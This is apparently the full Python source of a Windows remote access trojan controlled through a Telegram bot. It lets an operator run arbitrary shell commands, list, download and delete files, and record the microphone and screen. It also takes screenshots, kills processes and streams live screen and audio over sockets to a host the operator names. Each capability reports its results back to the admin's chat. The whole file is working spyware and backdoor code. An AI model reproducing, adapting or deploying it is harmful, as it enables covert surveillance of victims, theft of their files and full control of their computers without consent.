import pyautogui
import pyaudio
import socket
import pickle
import struct
import wave
import cv2
import os

import time
import sys


import numpy as np

from telebot.types import KeyboardButton, ReplyKeyboardMarkup
from subprocess import Popen, PIPE
from threading import Thread
from telebot import TeleBot
from ctypes  import windll



""" Fn """
def checkID(ms):
	if ms.from_user.id == ADMIN_ID:
		return True
	else:
		info_text = f"""
		USED:
		Id: {ms.from_user.id}
		Name: {ms.from_user.first_name}
		Surname: {ms.from_user.last_name}
		UserName: {ms.from_user.username}
		Language: {ms.from_user.language_code}
		CMD: {ms.text}
		"""
		bot.send_message(ADMIN_ID, info_text)
		return False



""" Functional """
class Client:
	def __init__(self):
		self.SCREEN_WIDTH = windll.user32.GetSystemMetrics(0)
		self.SCREEN_HEIGHT = windll.user32.GetSystemMetrics(1)
		self.SCREEN_SIZE = (self.SCREEN_WIDTH, self.SCREEN_HEIGHT)
		self.FOURCC = cv2.VideoWriter_fourcc(*"XVID")
		
		self.FORMAT = pyaudio.paInt16
		self.RATE = 44100
		self.CHANNELS = 1
		self.CHUNK = 8192
		
		self.filename_recorded_microphone = "ofline_recorded_microphone.wav"
		self.filename_recorded_microphone_dump = "ofline_recorded_microphone_dump.dat"
		self.filename_unpacked_dump_recorded_microphone = "unpacked_dump__ofline_recorded_microphone.wav"
		self.filename_video = "ofline_recorded_video.avi"

	def create_markup(self, ms, filename):
		markup = ReplyKeyboardMarkup()
		list_files = os.listdir(os.getcwd())

		if len(list_files) >= 200:
			output = "\n".join(list_files)
			with open(f"d:/{filename}.txt", "w") as file:
				file.write(output)
			
			with open(f"d:/{filename}.txt", "r") as file:
				bot.send_document(ms.chat.id, file, reply_markup=markup)
			
			os.remove(f"d:/{filename}.txt")
		else:
			[markup.add(i) for i in list_files[0:200]]

		markup.add("EXIT")
		return markup

	def cd(self, ms):
		bot.send_message(ms.chat.id, os.getcwd(), reply_markup=markup)

	def chdir(self, ms):
		markup_chdir = self.create_markup(ms, "paths")
		markup_chdir.add("..")
		bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_chdir)
		
		@bot.message_handler(content_types=["text"])
		def chdir_next(ms):
			if ms.text != "EXIT":
				try:
					os.chdir(ms.text)
					bot.send_message(ms.chat.id, os.getcwd(), reply_markup=markup)
				except Exception as e:
					bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
			else:
				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)

		bot.register_next_step_handler(ms, chdir_next)

	def dir(self, ms):
		try:
			output = os.listdir()
			if len(output) >= 200:
				output = "\n".join(output)
				with open("d:/list_files.txt", "w") as file:
					file.write(output)
				
				with open("d:/list_files.txt", "r") as file:
					bot.send_document(ms.chat.id, file, reply_markup=markup)
				
				os.remove("d:/list_files.txt")

			elif output:
				output = "\n".join(output)
				bot.send_message(ms.chat.id, output, reply_markup=markup)

			else:
				bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
		except Exception as e:
			bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)

	def rm_file(self, ms):
		markup_rm = self.create_markup(ms, "paths")
		bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_rm)

		@bot.message_handler(content_types=["text"])
		def rm_file_next(ms):
			if ms.text != "EXIT":
				try:
					os.remove(ms.text)
					bot.send_message(ms.chat.id, "File removed ✅", reply_markup=markup)
				except Exception as e:
					bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
			else:
				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)

		bot.register_next_step_handler(ms, rm_file_next)

	def exec_cmd(self, ms):
		markup_exec_cmd = ReplyKeyboardMarkup()
		markup_exec_cmd.add("EXIT")
		bot.send_message(ms.chat.id, "Enter command...", reply_markup=markup_exec_cmd)

		@bot.message_handler(content_types=["text"])
		def exec_cmd_next(ms):
			if ms.text != "EXIT":
				try:
					output = Popen(ms.text.split(" "), stdout=PIPE, stderr=PIPE, shell=True)
					result, err = output.communicate()
					try:
						result = result.decode("utf-8")
					except:
						result = result.decode("cp866")
      
					len_result = len(result.split("\n"))
					
					if len_result > 200:
						with open("output.txt", "w") as file:
							file.write(result)
						
						with open("output.txt", "r") as file:
							bot.send_document(ms.chat.id, file, reply_markup=markup)
						
						os.remove("output.txt")
					
					elif len_result:
						bot.send_message(ms.chat.id, result, reply_markup=markup)
	
					else:
						bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
				except Exception as e:
					bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
			else:
				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)

		bot.register_next_step_handler(ms, exec_cmd_next)


	def get_file(self, ms):
		markup_get_file = self.create_markup(ms, "paths")
		bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_get_file)
		
		@bot.message_handler(content_types=["text"])
		def get_file_next(ms):
			if ms.text != "EXIT":
				try:
					bot.send_document(ms.chat.id, open(ms.text, "rb"), reply_markup=markup)
				except Exception as e:
					bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
			else:
				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)

		bot.register_next_step_handler(ms, get_file_next)


	def record_microphone(self, ms):
		markup_record_audio = ReplyKeyboardMarkup()
		markup_record_audio.add("EXIT")
		bot.send_message(ms.chat.id, "Enter time, quantity iteration...", reply_markup=markup_record_audio)

		@bot.message_handler(content_types=["text"])
		def record_audio_next(ms):
			if ms.text != "EXIT":
				try:
					list_data = ms.text.split(" ")
					time = int(list_data[0])
					quantity = int(list_data[1])

					bot.send_message(ms.chat.id, "Recording 🎲", reply_markup=markup)

					for i in range(quantity):
						self.record_microphone_fn(time)
						with open(self.filename_recorded_microphone, 'rb') as audio:
							bot.send_audio(ms.chat.id, audio)

					os.remove(self.filename_recorded_microphone)
					bot.send_message(ms.chat.id, "Finished recording ✅", reply_markup=markup)
				except Exception as e:
					bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
			else:
				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)

		bot.register_next_step_handler(ms, record_audio_next)

	def get_audio(self, ms):
		with open(self.filename_recorded_microphone_dump, "rb") as dump_in:
			unpickler = pickle.Unpickler(dump_in)
			frame = unpickler.load()

			p = pyaudio.PyAudio()
			stream = p.open(format=self.FORMAT,
							channels=self.CHANNELS,
							rate=self.RATE,
							input=True,
							output=True,
							frames_per_buffer=self.CHUNK)

			wf = wave.open(self.filename_unpacked_dump_recorded_microphone, "wb")
			wf.setnchannels(self.CHANNELS)
			wf.setsampwidth(p.get_sample_size(self.FORMAT))
			wf.setframerate(self.RATE)
			wf.writeframes(b"".join(frame))
			wf.close()

		with open(self.filename_unpacked_dump_recorded_microphone, "rb") as audio:
			bot.send_message(ms.chat.id, "Unpacked ✅", reply_markup=markup)
			bot.send_audio(ms.chat.id, audio)

		os.remove(self.filename_recorded_microphone_dump)
		os.remove(self.filename_unpacked_dump_recorded_microphone)


	def record_video(self, ms):
		bot.send_message(ms.chat.id, "Recording 🎲", reply_markup=markup)

		while True:
			video = cv2.VideoWriter(filename=self.filename_video, fourcc=self.FOURCC, fps=15.0, frameSize=(self.SCREEN_SIZE))
			while True:
				if os.stat(self.filename_video).st_size >= 18185088:
					cv2.destroyAllWindows()
					video.release()
					with open(self.filename_video, "rb") as video:
						bot.send_video(ms.chat.id, video)

					os.remove(self.filename_video)
					break
				
				frame = pyautogui.screenshot()
				frame = np.array(frame)

				frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
				video.write(frame)

	def get_video(self, ms):
		markup_video = self.create_markup(ms, "paths")
		bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_video)

		@bot.message_handler(content_types=["text"])
		def get_video_next(ms):
			if ms.text != "EXIT":
				try:
					bot.send_message(ms.chat.id, "Sending a video 🎲", reply_markup=markup)
					with open(ms.text, "rb") as video:
						bot.send_video(ms.chat.id, video)
					os.remove(ms.text)
				except Exception as e:
					bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
			else:
				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)

		bot.register_next_step_handler(ms, get_video_next)


	def get_screen(self, ms):
		markup_get_screen = ReplyKeyboardMarkup()
		markup_get_screen.add("EXIT")
		bot.send_message(ms.chat.id, "Enter port, host...", reply_markup=markup_get_screen)
		
		@bot.message_handler(content_types=["text"])
		def getscreen_next(ms):
			if ms.text != "EXIT":
				try:
					list_data = ms.text.split()
					PORT = int(list_data[0])
					HOST = list_data[1]

					Thread(target=self.listening_microphone, args=(HOST, ms)).start()

					server_socket_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					try:
						bot.send_message(ms.chat.id, "Connection attempt 🎲")
						server_socket_s.connect((HOST, PORT))
					except Exception as e:
						bot.send_message(ms.chat.id, f"Error connection ❌\n{e}", reply_markup=markup)
						return

					bot.send_message(ms.chat.id, "Successful connection ✅", reply_markup=markup)
					
					__running = True
					while __running:
						screen = pyautogui.screenshot()
						frame = np.array(screen)
						frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
						frame = cv2.resize(frame, (1280, 768), interpolation=cv2.INTER_AREA)
						result, frame = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 95])
						data = pickle.dumps(frame, 0)
						
						try:
							server_socket_s.sendall(struct.pack(">L", len(data)) + data)
						except:
							__running = False

				except Exception as e:
					__running = False
			else:
				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)

		bot.register_next_step_handler(ms, getscreen_next)

	def screenshot(self, ms):
		myScreenshot = pyautogui.screenshot()
		myScreenshot.save("d:/screenshot.jpg")

		try:
			bot.send_message(ms.chat.id, f"Send photo...", reply_markup=markup)
			with open("d:/screenshot.jpg", "rb") as photo:
				bot.send_photo(ms.chat.id, photo)

			os.remove("d:/screenshot.jpg")
		except Exception as e:
			bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)


	def tasklist(self, ms):
		output = Popen(["tasklist"], stdout=PIPE, stderr=PIPE, shell=True)
		result, err = output.communicate()

		with open("tasklist.txt", "w") as file:
			try:
				file.write(result.decode("utf-8"))
			except:
				file.write(result.decode("cp866"))
		
		with open("tasklist.txt", "r") as file:
			bot.send_document(ms.chat.id, file, reply_markup=markup)
		
		os.remove("tasklist.txt")

	def taskkill(self, ms):
		markup_taskkill = ReplyKeyboardMarkup()
		markup_taskkill.add("EXIT")
		bot.send_message(ms.chat.id, "Enter process...", reply_markup=markup_taskkill)
		
		@bot.message_handler(content_types=["text"])
		def taskkill_next(ms):
			if ms.text != "EXIT":
				try:
					os.system(f"taskkill /f /im {ms.text} >nul 2>&1")
					bot.send_message(ms.chat.id, "process killed", reply_markup=markup)
				except Exception as e:
					bot.send_message(ms.chat.id, f"Error __taskkill__:\n{e}", reply_markup=markup)
			else:
				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)

		bot.register_next_step_handler(ms, taskkill_next)


	def record_microphone_fn(self, time=6):
		p = pyaudio.PyAudio()
		stream = p.open(format=self.FORMAT,
						channels=self.CHANNELS,
						rate=self.RATE,
						input=True,
						output=True,
						frames_per_buffer=self.CHUNK)
		
		frames = []
		for i in range(int(self.RATE / self.CHUNK * time)):
			data = stream.read(self.CHUNK)
			frames.append(data)

			with open(self.filename_recorded_microphone_dump, 'wb') as dump_rm:
				pickle.dump(frames, dump_rm, protocol=3)

		stream.stop_stream()
		stream.close()
		p.terminate()
		
		wf = wave.open(self.filename_recorded_microphone, "wb")
		wf.setnchannels(self.CHANNELS)
		wf.setsampwidth(p.get_sample_size(self.FORMAT))
		wf.setframerate(self.RATE)
		wf.writeframes(b"".join(frames))
		wf.close()

	def listening_microphone(self, HOST, ms):
		PORT = 9999
		__running = True

		p = pyaudio.PyAudio()
		stream = p.open(format=self.FORMAT, channels=self.CHANNELS, rate=self.RATE,
						input=True, output=True, frames_per_buffer=self.CHUNK)

		try:
			server_socket_m = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			server_socket_m.connect((HOST, PORT))
		except Exception as e:
			bot.send_message(ms.chat.id, f"Error __listening_microphone__❌\n{e}", reply_markup=markup)
			return

		while __running:
			try:
				server_socket_m.sendall(stream.read(self.CHUNK))
			except:
				__running = False

		stream.stop_stream()
		stream.close()
		server_socket_m.close()
		server_socket_m.close()
		p.terminate()



""" Variables """
API_TOKEN = "token"
ADMIN_ID = id

bot = TeleBot(API_TOKEN)

markup = ReplyKeyboardMarkup(True, True)
markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
		KeyboardButton("dir"), KeyboardButton("rm_file"),
		KeyboardButton("exec_cmd"), KeyboardButton("get_file"),
		KeyboardButton("record_microphone"), KeyboardButton("get_audio"),
		KeyboardButton("record_video"), KeyboardButton("get_video"),
		KeyboardButton("get_screen"), KeyboardButton("screenshot"),
		KeyboardButton("tasklist"), KeyboardButton("taskkill"))



""" Start """
client = Client()
methods = {
	"cd": client.cd,
	"chdir": client.chdir,
	"dir": client.dir,
	"rm_file": client.rm_file,
	"exec_cmd": client.exec_cmd,
	"get_file": client.get_file,
	"record_microphone": client.record_microphone,
	"get_audio": client.get_audio,
	"record_video": client.record_video,
	"get_video": client.get_video,
	"get_screen": client.get_screen,
	"screenshot": client.screenshot,
	"tasklist": client.tasklist,
	"taskkill": client.taskkill,
	"record_microphone": client.record_microphone,
	"listening_microphone": client.listening_microphone,
}



while True:
	try:
		bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)

		@bot.message_handler(commands=["_start"])
		def send_welcome(ms):
			if checkID(ms):
				bot.send_message(ms.chat.id, text="/_start", reply_markup=markup)

		@bot.message_handler(content_types=["text"])
		def checkCommand(ms):
			if checkID(ms):
				try:
					methods[ms.text](ms)
				except Exception as e:
					bot.send_message(ms.chat.id, f"Error __check_command__:\n{e}", reply_markup=markup)

		bot.polling(none_stop=True, interval=0)
	except:
		time.sleep(30)
  


